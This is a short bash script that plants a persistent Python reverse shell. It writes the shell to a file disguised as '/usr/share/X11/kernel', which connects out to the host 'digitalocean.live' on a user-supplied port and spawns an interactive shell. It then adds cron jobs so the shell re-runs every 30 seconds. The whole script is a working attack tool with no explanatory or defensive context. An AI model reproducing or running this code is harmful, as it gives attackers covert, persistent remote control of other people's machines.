#!/bin/bash

read -p "Enter port to connect to: " port

cat <<EOF > /usr/share/X11/kernel
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("digitalocean.live",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &
EOF

chmod +x /usr/share/X11/kernel

# Add to cron
(crontab -l 2>/dev/null; echo "* * * * * /usr/share/X11/kernel") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * sleep 30 && /usr/share/X11/kernel") | crontab -

echo "[+] Reverse shell script created with digitalocean.live and port $port"
